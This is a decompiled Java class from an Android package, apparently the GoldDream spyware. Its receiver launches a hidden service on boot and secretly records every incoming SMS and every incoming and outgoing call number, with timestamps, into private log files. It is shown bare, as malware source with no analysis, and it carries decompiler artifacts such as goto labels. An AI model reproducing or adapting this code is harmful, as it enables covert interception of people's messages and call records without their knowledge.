// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.GoldDream.zj;

import android.content.*;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import java.io.*;
import java.sql.Date;
import java.text.SimpleDateFormat;

// Referenced classes of package com.GoldDream.zj:
//            zjService

public class zjReceiver extends BroadcastReceiver
{

    public zjReceiver()
    {
        sms_code = "";
        sms_body = "";
        sms_time = "";
        outcall_phoneNumber = "";
    }

    private void WriteRec(Context context, String s, String s1)
    {
        FileOutputStream fileoutputstream = context.openFileOutput(s, 32768);
        fileoutputstream.write((new StringBuilder(String.valueOf(s1))).append("\r\n").toString().getBytes());
        fileoutputstream.close();
_L1:
        return;
        FileNotFoundException filenotfoundexception;
        filenotfoundexception;
        filenotfoundexception.printStackTrace();
          goto _L1
        IOException ioexception;
        ioexception;
        ioexception.printStackTrace();
          goto _L1
    }

    private String getSystemTime()
    {
        return (new SimpleDateFormat("yyyy-MM-dd hh:mm:ss")).format(Long.valueOf(System.currentTimeMillis()));
    }

    public void onReceive(Context context, Intent intent)
    {
        if(!intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) goto _L2; else goto _L1
_L1:
        Intent intent1 = new Intent("android.intent.action.RUN");
        intent1.setClass(context, com/GoldDream/zj/zjService);
        context.startService(intent1);
_L4:
        return;
_L2:
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
        {
            Bundle bundle = intent.getExtras();
            if(bundle != null)
            {
                Object aobj[] = (Object[])bundle.get("pdus");
                SmsMessage asmsmessage[] = new SmsMessage[aobj.length];
                int i = 0;
                while(i < aobj.length) 
                {
                    asmsmessage[i] = SmsMessage.createFromPdu((byte[])aobj[i]);
                    sms_code = asmsmessage[i].getOriginatingAddress();
                    sms_body = asmsmessage[i].getDisplayMessageBody();
                    Date date = new Date(asmsmessage[i].getTimestampMillis());
                    sms_time = (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(date);
                    WriteRec(context, "zjsms.txt", (new StringBuilder(String.valueOf(sms_code))).append("#").append(sms_body).append("#").append(sms_time).toString());
                    i++;
                }
            }
        } else
        if(intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL"))
        {
            incomingFlag = Boolean.valueOf(false);
            outcall_phoneNumber = intent.getStringExtra("android.intent.extra.PHONE_NUMBER");
            String s2 = getSystemTime();
            WriteRec(context, "zjphonecall.txt", (new StringBuilder("OUT#")).append(outcall_phoneNumber).append("#").append(s2).toString());
        } else
        {
            switch(((TelephonyManager)context.getSystemService("phone")).getCallState())
            {
            default:
                break;

            case 0: // '\0'
                if(incomingFlag.booleanValue())
                {
                    String s1 = getSystemTime();
                    WriteRec(context, "zjphonecall.txt", (new StringBuilder("IN_END#")).append(income_phoneNumber).append("#").append(s1).toString());
                }
                break;

            case 1: // '\001'
                incomingFlag = Boolean.valueOf(true);
                income_phoneNumber = intent.getStringExtra("incoming_number");
                break;

            case 2: // '\002'
                if(incomingFlag.booleanValue())
                {
                    String s = getSystemTime();
                    WriteRec(context, "zjphonecall.txt", (new StringBuilder("IN_BEGIN#")).append(income_phoneNumber).append("#").append(s).toString());
                }
                break;
            }
        }
        if(true) goto _L4; else goto _L3
_L3:
    }

    private static final String ACTION_BOOT = "android.intent.action.BOOT_COMPLETED";
    private static final String PHONECALL_FILE_NAME = "zjphonecall.txt";
    private static final String SMS_FILE_NAME = "zjsms.txt";
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static String income_phoneNumber = "";
    private static Boolean incomingFlag = Boolean.valueOf(false);
    private String outcall_phoneNumber;
    private String sms_body;
    private String sms_code;
    private String sms_time;

}
